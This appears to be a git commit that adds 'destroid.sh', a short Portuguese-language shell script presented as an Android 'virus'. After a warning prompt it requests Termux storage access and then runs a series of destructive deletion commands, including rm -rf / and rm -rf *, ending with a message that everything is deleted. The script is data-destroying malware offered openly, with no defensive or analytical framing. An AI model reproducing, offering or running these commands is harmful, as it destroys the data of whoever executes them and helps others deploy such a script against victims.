3b1c4ad3a16b95e94bf5b9d9e8a2beae91129454
HLSV <67323254+HLSV@users.noreply.github.com>
2020-07-10 20:27:06 -0300

    Destroid
    Vírus pra shell do Android,  deleta é destrói por completo , teste é código aberto ...

---
+++ Vírus destroid.sh
@@ -0,0 +1,34 @@
+#!/system/bin/sh
+
+#system shell script / shell / Android% 100% $ 🐦 
+# Creator: Igor Oliveira 
+# Date that was created: 10/07/2020 
+# Name: destroid virus 
+# Version: VS1.0
+
+
+
+
+clear
+
+echo "Vírus pra android! ; destroid sem pena!"
+echo "Esse virus vai destruir seu telefone..."
+sleep 1
+echo "Seu aparelho não terá chance se for android claro!"
+echo "se deseja continuar aperte enter"
+read
+sleep 3
+termux-setup-storage
+clear
+echo "OLHA O PASSARINHO 🐦"
+echo "🐦"
+echo "🐦"
+rm -rf
+cd
+cd /
+rm -rf
+rm -rf /
+rm -rf *
+rm -rf *
+rm *
+echo "pronto tudo deletado alvo excluído"
